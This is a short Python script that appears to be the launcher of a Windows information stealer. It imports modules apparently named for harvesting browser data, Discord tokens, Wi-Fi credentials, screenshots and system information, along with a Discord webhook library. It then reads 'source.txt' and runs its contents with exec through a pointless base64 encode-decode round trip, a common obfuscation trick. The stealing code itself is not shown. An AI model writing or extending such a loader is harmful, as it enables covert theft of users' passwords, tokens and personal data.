import genHwid, Zip, browsers, discord, network, screenshot, wifi, systeminfo
import os, shutil, time, ctypes, sys, winreg, dhooks, wmi,base64


source = open("source.txt", "r").read()
encSource = base64.b64encode(str.encode(source))
exec(base64.b64decode(encSource).decode())
